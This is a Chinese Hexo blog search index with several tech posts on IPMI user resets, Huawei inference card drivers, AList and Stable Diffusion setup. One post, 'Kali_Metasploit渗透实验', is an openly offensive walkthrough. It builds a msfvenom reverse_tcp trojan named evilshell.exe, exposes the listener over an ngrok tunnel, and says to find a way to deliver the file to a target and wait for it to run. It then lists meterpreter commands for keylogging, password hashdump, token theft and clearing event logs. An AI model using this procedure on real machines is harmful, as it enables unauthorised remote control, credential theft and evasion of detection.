<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IPMI+IPMICFG管理工具</title>
      <link href="/2023/08/27/ipmi-ipmicfg-guan-li-gong-ju/"/>
      <url>/2023/08/27/ipmi-ipmicfg-guan-li-gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>公司最近接手了一台超微主板X11SPL-F的服务器,客户说太吵了,要改风扇转速,但是又忘记了进去后台的账号密码,只能把密码重置或者新建一个账号才能进后台调试,所以记录下部分操作过程。<br>##准备事项<br>主板为X11SPL服务器一台<br>IPMICFG工具<br>如果非本地操作,另外一台机器一定要和服务器同网段,否则无法连上后台</p><h2 id="安装IPMICFG"><a href="#安装IPMICFG" class="headerlink" title="安装IPMICFG"></a>安装IPMICFG</h2><p><a href="https://vtdd.vip:4343/index.php/s/LCjpqWJJTpYRHgT/download/IPMICFG_1.30.0_build.190710.zip">下载IPMICFG</a>解压,里面有对应的操作系统,自行选择。</p><h2 id="linux使用"><a href="#linux使用" class="headerlink" title="linux使用"></a>linux使用</h2><p>打开终端输入以下代码</p><figure class="highlight crmsh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment">#进入对应文件夹</span><br>cd /home/limita/IPMICFG_1.<span class="hljs-number">30.0</span>_build.<span class="hljs-number">190710</span>/linux/Linux/<span class="hljs-number">64</span>bit/<br><span class="hljs-comment">#查看用户</span><br>./IPMICFG-Linux.x86_64 -<span class="hljs-keyword">user</span> <span class="hljs-title">list</span><br><span class="hljs-comment">#添加用户 ID 3 账号dingfei 密码 dingfei 用户权限 4(管理员-Adinistrator)</span><br>./IPMICFG-Linux.x86_64 -<span class="hljs-keyword">user</span> <span class="hljs-title">add</span> <span class="hljs-number">3</span> dingfei dingfei <span class="hljs-number">4</span><br><span class="hljs-comment">#修改用户密码 ID 3 密码 ADMIN</span><br>./IPMICFG-Linux.x86_64 -<span class="hljs-keyword">user</span> <span class="hljs-title">setpwd</span> <span class="hljs-number">3</span> ADMIN<br><span class="hljs-comment">#设置用户级别 ID 3 用户权限 2(普通用户)</span><br>./IPMICFG-Linux.x86_64 -<span class="hljs-keyword">user</span> <span class="hljs-title">level</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-comment">#删除用户 删除用户ID 3 </span><br>./IPMICFG-Linux.x86_64 -<span class="hljs-keyword">user</span> <span class="hljs-title">del</span> <span class="hljs-number">3</span> <br></code></pre></td></tr></tbody></table></figure><h2 id="DOS使用"><a href="#DOS使用" class="headerlink" title="DOS使用"></a>DOS使用</h2><figure class="highlight crmsh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment">#查看当前目录下的文件</span><br>dir<br><span class="hljs-comment">#进入对应文件夹</span><br>cd /IPMICFG_1.<span class="hljs-number">30.0</span>_build.<span class="hljs-number">190710</span>/<br><span class="hljs-comment">#查看用户</span><br>./IPMICFG.exe -<span class="hljs-keyword">user</span> <span class="hljs-title">list</span><br><span class="hljs-comment">#添加用户 ID 3 账号dingfei 密码 dingfei 用户权限 4(管理员-Adinistrator)</span><br>./IPMICFG.exe -<span class="hljs-keyword">user</span> <span class="hljs-title">add</span> <span class="hljs-number">3</span> dingfei dingfei <span class="hljs-number">4</span><br><span class="hljs-comment">#修改用户密码 ID 3 密码 ADMIN</span><br>./IPMICFG.exe -<span class="hljs-keyword">user</span> <span class="hljs-title">setpwd</span> <span class="hljs-number">3</span> ADMIN<br><span class="hljs-comment">#设置用户级别 ID 3 用户权限 2(普通用户)</span><br>./IPMICFG.exe -<span class="hljs-keyword">user</span> <span class="hljs-title">level</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-comment">#删除用户 删除用户ID 3 </span><br>./IPMICFG.exe -<span class="hljs-keyword">user</span> <span class="hljs-title">del</span> <span class="hljs-number">3</span> <br></code></pre></td></tr></tbody></table></figure><p>打开浏览器输入IPMI的IP进入web界面输入你自己设置好的账号密码。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>后台界面和一般的web控制面板差不多,还挺好用的。</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>300l_pro推算卡驱动固件部署</title>
      <link href="/2023/03/04/hua-wei-tui-suan-qia-300l-pro/"/>
      <url>/2023/03/04/hua-wei-tui-suan-qia-300l-pro/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工作需要</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1100274096/b1977c97">https://support.huawei.com/enterprise/zh/doc/EDOC1100274096/b1977c97</a><br><a href="https://cloud.tencent.com/developer/article/2121267">https://cloud.tencent.com/developer/article/2121267</a></p><h1 id="准备事项"><a href="#准备事项" class="headerlink" title="准备事项"></a>准备事项</h1><p>ubuntu18.04<br>对应推算卡的驱动和固件</p><h1 id="确定内核版本"><a href="#确定内核版本" class="headerlink" title="确定内核版本"></a>确定内核版本</h1><p>参考下图里面的系统对应内核的版本，不对应请自行切换内核<br><img src="https://vtdd.vip:4343/d/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%93/1677873211660.png?sign=cZqw8SA3rDbGa9WjiIFwDiBS_qfUyCY1ZelGtLgbcOI=:0" alt="对照表"><br><img src="https://vtdd.vip:4343/d/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%93/1677873231528.png?sign=DwOpQqAsvQjLLzt6MCUkThB3iJ8H2LSE4KOl7JgtgXQ=:0" alt="对照表"></p><h1 id="新建驱动需要用的用户"><a href="#新建驱动需要用的用户" class="headerlink" title="新建驱动需要用的用户"></a>新建驱动需要用的用户</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">groupadd HwHiAiUser<br>useradd -g HwHiAiUser -d <span class="hljs-regexp">/home/</span>HwHiAiUser -m HwHiAiUser -s <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></tbody></table></figure><h1 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h1><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//进入root用户</span><br>sudo -i<br><br><span class="hljs-comment">//进入驱动的文件夹</span><br>cd /home/HwHiAiUser<br><br><span class="hljs-comment">//给驱动包添加可执行权限</span><br>chmod +x ./驱动包.run<br><br><span class="hljs-comment">//提升权限</span><br>chmod 777 ./驱动包.run<br><br><span class="hljs-comment">//安装驱动包,驱动包默认安装路径为“/usr/local/Ascend”</span><br>./驱动包.run --full<br><br><span class="hljs-comment">//如果终端出返回下面信息则表示安装成功</span><br>Driver package installed successfully! <br><br><span class="hljs-comment">//重启</span><br>init 6<br><br><span class="hljs-comment">//查询驱动是否安装成功</span><br>npm-smi info<br><br><span class="hljs-comment">//返回结果</span><br><span class="hljs-code">+----------------------------------------------------------------------------------------------------+</span><br><span class="hljs-section">| npu-smi 22.0.3                            Version: 22.0.3                                          |</span><br><span class="hljs-section">+-------------------+-----------------+--------------------------------------------------------------+</span><br>| NPU     Name      | Health          | Power(W)          Temp(C)              Hugepages-Usage(page) |<br><span class="hljs-section">| Chip    Device    | Bus-Id          | AICore(%)         Memory-Usage(MB)                           |</span><br><span class="hljs-section">+===================+=================+==============================================================+</span><br>| 4       310P3     | OK              | NA                43             0          / 970            |<br><span class="hljs-section">| 0       0         | 0000:81:00.0    | 0                 861  / 21534                               |</span><br><span class="hljs-section">+===================+=================+==============================================================+</span><br></code></pre></td></tr></tbody></table></figure><h1 id="安装固件"><a href="#安装固件" class="headerlink" title="安装固件"></a>安装固件</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>进入root用户<br>sudo -i<br><br><span class="hljs-regexp">//</span>进入固件的文件夹<br>cd <span class="hljs-regexp">/home/</span>HwHiAiUser<br><br><span class="hljs-regexp">//</span>给固件添加可执行权限<br>chmod +x ./固件包.run<br><br><span class="hljs-regexp">//</span>提升权限<br>chmod <span class="hljs-number">777</span> ./固件包.run<br><br><span class="hljs-regexp">//</span>安装固件包<br>./固件包 --full<br><br><span class="hljs-regexp">//</span>如果终端出返回下面信息则表示安装成功<br>Firmware package installed successfully!<br><br><span class="hljs-regexp">//</span>查看固件版本号<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/Ascend/</span>driver<span class="hljs-regexp">/tools/u</span>pgrade-tool --device_index -<span class="hljs-number">1</span> --component -<span class="hljs-number">1</span> --version<br></code></pre></td></tr></tbody></table></figure><h1 id="卸载驱动"><a href="#卸载驱动" class="headerlink" title="卸载驱动"></a>卸载驱动</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/driver/</span>script/uninstall.sh<br></code></pre></td></tr></tbody></table></figure><h1 id="卸载固件"><a href="#卸载固件" class="headerlink" title="卸载固件"></a>卸载固件</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/firmware/</span>script/uninstall.sh<br></code></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推算卡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali_Metasploit渗透实验</title>
      <link href="/2023/02/19/metasploit-shi-yan-zhi-zuo-mian-sha-payload-dui-ren-yi-wai-wang-zhu-ji-de-yuan-kong/"/>
      <url>/2023/02/19/metasploit-shi-yan-zhi-zuo-mian-sha-payload-dui-ren-yi-wai-wang-zhu-ji-de-yuan-kong/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近想玩玩渗透所以学了kial系统里面的Metasploit做个木马并且支持任何外网主机远控，本文只做技术交流之用，技术无罪，希望大家知法懂法，更要守法。</p><h1 id="准备事项"><a href="#准备事项" class="headerlink" title="准备事项"></a>准备事项</h1><p>kali<br>Metasploit<br>Ngrok客户端<br>攻击机<br>靶机</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/m0_58489132/article/details/121816285">https://blog.csdn.net/m0_58489132/article/details/121816285</a><br><a href="https://www.pianshen.com/article/47171021599/">https://www.pianshen.com/article/47171021599/</a><br><a href="https://www.ngui.cc/el/1741271.html?action=onClick">https://www.ngui.cc/el/1741271.html?action=onClick</a></p><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>为了能远控外网的主机，所以必须要攻击机和外网的主机能互相通信，这里用最简单的方法，如果你有公网也可以直接用公网ip也行，<a href="https://www.ngrok.cc/">https://www.ngrok.cc</a>，注册账号，根据提示，进行相关操作，选择免费隧道，<br><img src="https://image.3001.net/images/20190316/1552725125_5c8cb485f03f0.png!small" alt="选择隧道"></p><h1 id="配置端口隧道等"><a href="#配置端口隧道等" class="headerlink" title="配置端口隧道等"></a>配置端口隧道等</h1><p>远程端口不用本机用的端口即可，避免发生冲突<br><img src="https://image.3001.net/images/20190316/1552725152_5c8cb4a061c05.png!small" alt="配置端口隧道"><br>本地端口，如果是kali我们需要输入ifconfig看一下自己的ip填进去。<br>然后找到自己刚刚开通的隧道，看一下自己的配置信息，这里的隧道id和隧道端口，服务器地址接下来要用的：<br><img src="https://image.3001.net/images/20190316/1552725182_5c8cb4beb0413.png!small" alt="配置端口隧道"></p><h1 id="Ngrok客户端"><a href="#Ngrok客户端" class="headerlink" title="Ngrok客户端"></a>Ngrok客户端</h1><p><a href="https://www.ngrok.cc/download.html">https://www.ngrok.cc/download.html</a>，下载自己对应的版本,并且解压</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>www.ngrok.cc<span class="hljs-regexp">/sunny/</span>linux_amd64.zip?v=<span class="hljs-number">2.1</span><br>unzip linux_amd64.zip<br>cd linux_amd64<br>./sunny clientid 隧道ID<br></code></pre></td></tr></tbody></table></figure><p>出现下面的转发成功界面就可以了<br><img src="https://image.3001.net/images/20190316/1552725236_5c8cb4f479ed4.png!small" alt="Ngrok客户端"></p><h1 id="创建木马"><a href="#创建木马" class="headerlink" title="创建木马"></a>创建木马</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp lhost=刚才创建的隧道服务器地址 lport=隧道端口 -f 后门文件类型 &gt;<span class="hljs-regexp">/后门文件存放路径/</span>evilshell.exe<br></code></pre></td></tr></tbody></table></figure><p>并且想方法发送到目前机器上，等对方运行</p><h1 id="开启postgresql服务"><a href="#开启postgresql服务" class="headerlink" title="开启postgresql服务"></a>开启postgresql服务</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/postgresql start <br></code></pre></td></tr></tbody></table></figure><h1 id="查看postgresql服务"><a href="#查看postgresql服务" class="headerlink" title="查看postgresql服务"></a>查看postgresql服务</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/postgresql status<br></code></pre></td></tr></tbody></table></figure><h1 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h1><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ntulp</span><br></code></pre></td></tr></tbody></table></figure><h1 id="开启msfconsole"><a href="#开启msfconsole" class="headerlink" title="开启msfconsole"></a>开启msfconsole</h1><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></tbody></table></figure><h1 id="设置攻击模块并运行"><a href="#设置攻击模块并运行" class="headerlink" title="设置攻击模块并运行"></a>设置攻击模块并运行</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/multi/</span>handler     <span class="hljs-regexp">//</span>选择exploits<br> <br>set payload windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp   <span class="hljs-regexp">//</span>设置payload<br> <br>set LHOST  攻击者IP        <span class="hljs-regexp">//</span>修改LHOST参数<br>    <br>set LPORT  监听端口        <span class="hljs-regexp">//</span>修改LPORT参数<br> <br>show options              <span class="hljs-regexp">//</span>查看需要设置的参数<br> <br>run 或 exploit            <span class="hljs-regexp">//</span>运行攻击模块<br></code></pre></td></tr></tbody></table></figure><h1 id="获取目标主机shell"><a href="#获取目标主机shell" class="headerlink" title="获取目标主机shell"></a>获取目标主机shell</h1><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><br></code></pre></td></tr></tbody></table></figure><p>若出现乱码输入下面命令</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">437</span><br></code></pre></td></tr></tbody></table></figure><h1 id="其他的命令"><a href="#其他的命令" class="headerlink" title="其他的命令"></a>其他的命令</h1><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs vim">? – 帮助菜单<br>background – 将当前会话移动到背景<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br><span class="hljs-keyword">close</span> – 关闭通道<br><span class="hljs-keyword">exit</span> – 终止 meterpreter 会话<br><span class="hljs-keyword">help</span> – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br>migrate – 移动到一个指定的 PID 的活动进程<br><span class="hljs-keyword">quit</span> – 终止 meterpreter 会话<br><span class="hljs-keyword">read</span> – 从通道读取数据<br>run – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br><span class="hljs-keyword">write</span> – 将数据写入到一个通道<br><span class="hljs-keyword">cat</span> -读取并输出到标准输出文件的内容<br><span class="hljs-keyword">cd</span> -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br><span class="hljs-keyword">edit</span>-用 <span class="hljs-keyword">vim</span>编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br><span class="hljs-keyword">lcd</span> -更改本地目录<br>lpwd -打印本地目录<br><span class="hljs-keyword">ls</span> -列出在当前目录中的文件列表<br><span class="hljs-built_in">mkdir</span> -在受害者系统上的创建目录<br><span class="hljs-keyword">pwd</span> -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br>ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。<br>portfwd -端口转发<br>route -查看或修改受害者路由表<br>clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br><span class="hljs-keyword">execute</span>-执行命令<br><span class="hljs-built_in">getpid</span> -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br><span class="hljs-keyword">ps</span> -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br><span class="hljs-keyword">reg</span> -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br><span class="hljs-keyword">shell</span> -在受害者计算机上打开一个<span class="hljs-keyword">shell</span><br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br>enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br>getsystem -获得系统管理员权限<br>hashdump -抓去哈希密码 (SAM) 文件中的值<br>timestomp -操作修改，访问，并创建一个文件的属性<br></code></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AList网盘搭建</title>
      <link href="/2023/01/29/actions-zi-dong-bu-shu-hexo-bo-ke-hexoplusplus-hou-tai/"/>
      <url>/2023/01/29/actions-zi-dong-bu-shu-hexo-bo-ke-hexoplusplus-hou-tai/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>嫌弃nextcloud不够方便，换AList，AList也是我目前部署的网盘中最容易部署的网盘了。<br>AList是一个支持多种存储，支持网页浏览和 WebDAV 的文件列表程序，由 gin 和 Solidjs 驱动。简单的来说就是能够帮助你管理各种网盘应用，类似于CloudDrive，AList除了支持网盘存储之外，还支持对象存储，本地存储，FTP等等。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://alist.nn.ci/zh/guide/">https://alist.nn.ci/zh/guide/</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>alist.nn.ci<span class="hljs-regexp">/zh/gui</span>de/<br></code></pre></td></tr></tbody></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -fsSL <span class="hljs-string">"https://alist.nn.ci/v3.sh"</span> <span class="hljs-string">| bash -s update</span><br></code></pre></td></tr></tbody></table></figure><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -fsSL <span class="hljs-string">"https://alist.nn.ci/v3.sh"</span> <span class="hljs-string">| bash -s update</span><br></code></pre></td></tr></tbody></table></figure><h2 id="自定义路径"><a href="#自定义路径" class="headerlink" title="自定义路径"></a>自定义路径</h2><p>默认安装在 /opt/alist 中。 自定义安装路径，将安装路径作为第二个参数添加，必须是绝对路径（如果路径以 alist 结尾，则直接安装到给定路径，否则会安装在给定路径 alist 目录下），如 安装到 /root：</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 安装</span><br>curl -fsSL <span class="hljs-string">"https://alist.nn.ci/v3.sh"</span> <span class="hljs-string">| bash -s install /root</span><br><span class="hljs-meta"># 更新</span><br>curl -fsSL <span class="hljs-string">"https://alist.nn.ci/v3.sh"</span> <span class="hljs-string">| bash -s update /root</span><br><span class="hljs-meta"># 卸载</span><br>curl -fsSL <span class="hljs-string">"https://alist.nn.ci/v3.sh"</span> <span class="hljs-string">| bash -s uninstall /root</span><br></code></pre></td></tr></tbody></table></figure><h2 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h2><figure class="highlight crmsh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> alist<br></code></pre></td></tr></tbody></table></figure><h2 id="停止程序"><a href="#停止程序" class="headerlink" title="停止程序"></a>停止程序</h2><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">systemctl stop alist<br></code></pre></td></tr></tbody></table></figure><h2 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h2><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status alist</span><br></code></pre></td></tr></tbody></table></figure><h2 id="重启程序"><a href="#重启程序" class="headerlink" title="重启程序"></a>重启程序</h2><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart alist</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AList </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stable-diffusion-webui+novelai本地部署</title>
      <link href="/2022/10/20/stable-diffusion-webui-novelai-ben-di-bu-shu/"/>
      <url>/2022/10/20/stable-diffusion-webui-novelai-ben-di-bu-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/read/cv18971531?from=search&amp;spm_id_from=333.337.0.0">novelai本地泄露版达到网络版效果的教程，附整合下载，结尾16系黑屏处理方法 - 哔哩哔哩 (bilibili.com)</a><br><a href="https://www.bilibili.com/read/cv18993095?from=search&amp;spm_id_from=333.337.0.0">关于在安装novelai程序上的一些问题（第一弹） - 哔哩哔哩 (bilibili.com)</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近AI绘画很火，我自己也部署了一个玩玩。</p><h2 id="准备事项"><a href="#准备事项" class="headerlink" title="准备事项"></a>准备事项</h2><p>有8G以上显存的电脑<br>安装python<br>安装N卡驱动<br>安装steam++<br>下载stable-diffusion-webui<br>下载模型 magnet:?xt=urn:btih:5bde442da86265b670a3e5ea3163afad2c6f8ecc</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>把东西准备好后解压下载好的stable-diffusion-webui-master，直接点击webui-user然后等安装完就行了，过程比较久</li><li>把下载好的模型放进对应的文件夹（F:\stable-diffusion-webui-master\models\Stable-diffusion）后打开浏览器输入<a href="http://127.0.0.1:7860/%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E7%94%BB%E4%BA%86">http://127.0.0.1:7860/就可以进行AI绘画了</a></li><li>python，stean++，N卡驱动，这三个软件就不说怎么安装了，全程点下一步就行了。</li></ol><h2 id="注意事项一"><a href="#注意事项一" class="headerlink" title="注意事项一"></a>注意事项一</h2><p><img src="https://vtdd.vip:4343/index.php/s/jrncQSBk9ngGEbn/preview" alt="python安装过程"><br>必须点击Add Python to PATH 前面的复选框，否则请自行配置环境变量</p><h2 id="注意事项二"><a href="#注意事项二" class="headerlink" title="注意事项二"></a>注意事项二</h2><p><img src="https://vtdd.vip:4343/index.php/s/QWr39CjcWptoxej/preview" alt="stable-diffusion-webui安装过程"><br>这里是网络问题，记得把steam++开起来</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
